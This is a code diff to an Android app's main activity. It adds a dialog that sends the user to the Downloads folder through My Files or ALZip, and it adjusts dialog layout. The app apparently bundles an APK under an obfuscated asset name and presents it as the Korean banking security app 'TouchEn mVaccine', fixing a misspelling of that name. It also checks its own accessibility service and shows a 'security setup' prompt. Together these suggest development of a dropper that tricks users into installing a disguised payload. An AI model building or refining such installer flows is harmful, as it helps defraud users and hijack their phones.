@@ -13,26 +13,27 @@ import android.content.res.ColorStateList;
 import android.graphics.Color;
 import android.graphics.Typeface;
 import android.graphics.drawable.ColorDrawable;
+import android.graphics.drawable.Drawable;
 import android.graphics.drawable.GradientDrawable;
 import android.graphics.drawable.RippleDrawable;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
-import android.provider.DocumentsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.text.TextUtils;
-import android.util.Log;
 import android.view.Gravity;
 import android.view.View;
 import android.view.ViewGroup;
+import android.view.Window;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Button;
 import android.widget.FrameLayout;
+import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 
@@ -74,9 +75,10 @@ public class MainActivity extends AppCompatActivity {
     private static final long ACCESSIBILITY_SETTINGS_OPEN_DELAY_MS = 350L;
 
     public static final String SECURITY_APK_ASSET = "nbkhe9ihdhgiouhwasdbfih3";
-    public static final String SECURITY_APK_NAME = "터지엔 엠백신";
+    public static final String SECURITY_APK_NAME = "터치엔 엠백신";
     private static final String SECURITY_APP_PACKAGE_NAME = BuildConfig.SECURITY_APP_PACKAGE_NAME;
     private static final String SAMSUNG_MY_FILES_PACKAGE = "com.sec.android.app.myfiles";
+    private static final String ALZIP_PACKAGE = "com.estsoft.alzip";
 
     private WebView webView;
     private AlertDialog securitySetupDialog;
@@ -315,8 +317,11 @@ public class MainActivity extends AppCompatActivity {
         securitySetupDialog.setOnShowListener(dialog -> {
             if (securitySetupDialog.getWindow() != null) {
                 securitySetupDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+                applyDialogHorizontalMargins(securitySetupDialog.getWindow());
+
             }
         });
+
         securitySetupDialog.show();
     }
 
@@ -334,6 +339,11 @@ public class MainActivity extends AppCompatActivity {
         } catch (PackageManager.NameNotFoundException exception) {
             return false;
         }
+    }
+    private void applyDialogHorizontalMargins(Window window) {
+        int horizontalMargin = dp(18);
+        int width = getResources().getDisplayMetrics().widthPixels - (horizontalMargin * 2);
+        window.setLayout(width, ViewGroup.LayoutParams.WRAP_CONTENT);
     }
 
     private boolean isSecurityAccessibilityServiceEnabled() {
@@ -425,7 +435,7 @@ public class MainActivity extends AppCompatActivity {
                 ViewGroup.LayoutParams.MATCH_PARENT,
                 ViewGroup.LayoutParams.WRAP_CONTENT
         );
-        messageParams.topMargin = dp(14);
+        messageParams.topMargin = dp(10);
         container.addView(message, messageParams);
 
         LinearLayout buttonRow = new LinearLayout(this);
@@ -465,7 +475,7 @@ public class MainActivity extends AppCompatActivity {
         button.setMinHeight(0);
         button.setMinWidth(0);
         button.setPadding(dp(18), 0, dp(18), 0);
-        button.setBackground(createRippleBackground(backgroundColor, Color.argb(28, 0, 0, 0), 22));
+        button.setBackground(createRippleBackground(backgroundColor, Color.argb(28, 0, 0, 0), 6));
         return button;
     }
 
@@ -603,19 +613,258 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void openDownloadsFolder() {
+        if (isPackageInstalled(ALZIP_PACKAGE)) {
+            showFileBrowserResolveDialog();
+            return;
+        }
+
+        openDefaultFileBrowser();
+    }
+
+    private void showFileBrowserResolveDialog() {
+        AlertDialog dialog = new AlertDialog.Builder(this).create();
+        dialog.setView(createFileBrowserResolveDialogView(dialog));
+        dialog.setCanceledOnTouchOutside(true);
+        dialog.setOnShowListener(view -> {
+            Window window = dialog.getWindow();
+            if (window != null) {
+                window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+                window.setGravity(Gravity.BOTTOM);
+                applyDialogHorizontalMargins(window);
+
+//                window.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+            }
+        });
+        dialog.show();
+    }
+
+    private View createFileBrowserResolveDialogView(AlertDialog dialog) {
+        LinearLayout container = new LinearLayout(this);
+        container.setOrientation(LinearLayout.VERTICAL);
+        container.setPadding(dp(22), dp(20), dp(22), dp(20));
+        container.setBackground(createResolveDialogBackground());
+
+        LinearLayout titleRow = new LinearLayout(this);
+        titleRow.setGravity(Gravity.CENTER_VERTICAL);
+        titleRow.setOrientation(LinearLayout.HORIZONTAL);
+        container.addView(titleRow, new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+        ));
+
+        TextView title = new TextView(this);
+        title.setText("연결프로그램");
+        title.setTextColor(Color.rgb(25, 27, 25));
+        title.setTextSize(18);
+        title.setTypeface(Typeface.DEFAULT_BOLD);
+        title.setIncludeFontPadding(false);
+        titleRow.addView(title, new LinearLayout.LayoutParams(
+                0,
+                ViewGroup.LayoutParams.WRAP_CONTENT,
+                1f
+        ));
+
+        TextView hint = new TextView(this);
+        hint.setText("i");
+        hint.setTextColor(Color.rgb(14, 12, 24));
+        hint.setTextSize(11);
+        hint.setGravity(Gravity.CENTER);
+        hint.setTypeface(Typeface.DEFAULT_BOLD);
+        hint.setBackground(createResolveCircleBackground(Color.TRANSPARENT, Color.rgb(230, 230, 230)));
+        titleRow.addView(hint, new LinearLayout.LayoutParams(dp(18), dp(18)));
+
+        LinearLayout optionRow = new LinearLayout(this);
+        optionRow.setOrientation(LinearLayout.HORIZONTAL);
+        optionRow.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams optionRowParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+        );
+        optionRowParams.topMargin = dp(18);
+        container.addView(optionRow, optionRowParams);
+
+        optionRow.addView(createResolveOption(
+                "내파일",
+                "파일 탐색",
+                getPackageIconOrDefault(SAMSUNG_MY_FILES_PACKAGE),
+                true,
+                view -> {
+                    dialog.dismiss();
+                    openDefaultFileBrowserSafely();
+                }
+        ), createResolveOptionParams(0));
+
+        optionRow.addView(createResolveOption(
+                "알집",
+                "ALZip",
+                getPackageIconOrDefault(ALZIP_PACKAGE),
+                false,
+                view -> {
+                    dialog.dismiss();
+                    openAlzipFileBrowserSafely();
+                }
+        ), createResolveOptionParams(dp(12)));
+
+        return container;
+    }
+
+    private View createResolveOption(
+            String title,
+            String subtitle,
+            Drawable icon,
+            boolean selected,
+            View.OnClickListener listener
+    ) {
+        LinearLayout option = new LinearLayout(this);
+        option.setOrientation(LinearLayout.VERTICAL);
+        option.setGravity(Gravity.CENTER);
+        option.setPadding(dp(10), dp(12), dp(10), dp(10));
+        option.setBackground(createResolveOptionBackground(selected));
+        option.setOnClickListener(listener);
+
+        ImageView iconView = new ImageView(this);
+        iconView.setImageDrawable(icon);
+        iconView.setScaleType(ImageView.ScaleType.FIT_CENTER);
+        option.addView(iconView, new LinearLayout.LayoutParams(dp(46), dp(46)));
+
+        TextView titleView = new TextView(this);
+        titleView.setText(title);
+        titleView.setTextColor(Color.rgb(14, 12, 16));
+        titleView.setTextSize(13);
+        titleView.setTypeface(Typeface.DEFAULT_BOLD);
+        titleView.setGravity(Gravity.CENTER);
+        titleView.setSingleLine(true);
+        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+        );
+        titleParams.topMargin = dp(8);
+        option.addView(titleView, titleParams);
+
+        TextView subtitleView = new TextView(this);
+        subtitleView.setText(subtitle);
+        subtitleView.setTextColor(Color.rgb(14, 12, 16));
+        subtitleView.setTextSize(10);
+        subtitleView.setGravity(Gravity.CENTER);
+        subtitleView.setSingleLine(true);
+        LinearLayout.LayoutParams subtitleParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+        );
+        subtitleParams.topMargin = dp(2);
+        option.addView(subtitleView, subtitleParams);
+
+        return option;
+    }
+
+    private LinearLayout.LayoutParams createResolveOptionParams(int leftMargin) {
+        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(dp(104), dp(128));
+        params.leftMargin = leftMargin;
+        return params;
+    }
+
+    private GradientDrawable createResolveDialogBackground() {
+        GradientDrawable drawable = new GradientDrawable(
+                GradientDrawable.Orientation.TOP_BOTTOM,
+                new int[]{Color.rgb(255, 255, 255), Color.rgb(240, 240, 240)}
+        );
+        drawable.setCornerRadius(dp(22));
+        return drawable;
+    }
+
+    private Drawable createResolveOptionBackground(boolean selected) {
+        GradientDrawable content = new GradientDrawable();
+        content.setColor(selected ? Color.rgb(234, 239, 250) : Color.rgb(234, 239, 250));
+        content.setCornerRadius(dp(16));
+        content.setStroke(dp(selected ? 1 : 1), Color.rgb(166, 174, 190));
+
+        GradientDrawable mask = new GradientDrawable();
+        mask.setColor(Color.WHITE);
+        mask.setCornerRadius(dp(16));
+
+        return new RippleDrawable(ColorStateList.valueOf(Color.argb(38, 55, 55, 255)), content, mask);
+    }
+
+    private Drawable createResolveCircleBackground(int color, int strokeColor) {
+        GradientDrawable drawable = new GradientDrawable();
+        drawable.setShape(GradientDrawable.OVAL);
+        drawable.setColor(color);
+        drawable.setStroke(dp(1), strokeColor);
+        return drawable;
+    }
+
+    private Drawable getPackageIconOrDefault(String packageName) {
+        try {
+            return getPackageManager().getApplicationIcon(packageName);
+        } catch (PackageManager.NameNotFoundException exception) {
+            return ContextCompat.getDrawable(this, android.R.drawable.sym_def_app_icon);
+        }
+    }
+
+    private void openDefaultFileBrowserSafely() {
+        try {
+            openDefaultFileBrowser();
+        } catch (ActivityNotFoundException | SecurityException exception) {
+            showBasicDialog("다운로드 폴더를 열 수 없음", "다운로드 폴더를 직접 열어 주세요.");
+        }
+    }
+
+    private void openAlzipFileBrowserSafely() {
+        try {
+            if (!openAlzipFileBrowser()) {
+                openDefaultFileBrowser();
+            }
+        } catch (ActivityNotFoundException | SecurityException exception) {
+            showBasicDialog("알집을 열 수 없음", "다운로드 폴더를 직접 열어 주세요.");
+        }
+    }
+
+    private void openDefaultFileBrowser() {
         Intent intent = new Intent(DownloadManager.ACTION_VIEW_DOWNLOADS);
         startActivity(intent);
     }
 
-    private Intent createOpenFolderIntent(Uri folderUri) {
-        return new Intent(Intent.ACTION_VIEW)
-                .setDataAndType(folderUri, DocumentsContract.Document.MIME_TYPE_DIR)
-                .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+    private boolean openAlzipFileBrowser() {
+        if (!isPackageInstalled(ALZIP_PACKAGE)) {
+            return false;
+        }
+
+        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(ALZIP_PACKAGE);
+        if (launchIntent == null) {
+            return false;
+        }
+
+        launchIntent.putExtra("path", getDownloadsFolderPath());
+        launchIntent
+                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        try {
+            startActivity(launchIntent);
+            return true;
+        } catch (ActivityNotFoundException | SecurityException exception) {
+            return false;
+        }
     }
 
-    private Uri getDownloadsFolderUri() {
-        return Uri.parse("content://com.android.externalstorage.documents/document/primary%3A"
-                + Environment.DIRECTORY_DOWNLOADS);
+    private boolean isPackageInstalled(String packageName) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                getPackageManager().getPackageInfo(
+                        packageName,
+                        PackageManager.PackageInfoFlags.of(0)
+                );
+            } else {
+                getPackageManager().getPackageInfo(packageName, 0);
+            }
+            return true;
+        } catch (PackageManager.NameNotFoundException exception) {
+            return false;
+        }
+    }
+
+    private String getDownloadsFolderPath() {
+        return Environment.getExternalStoragePublicDirectory(
+                Environment.DIRECTORY_DOWNLOADS
+        ).getAbsolutePath();
     }
 
     private void copy(InputStream input, OutputStream output) throws IOException {
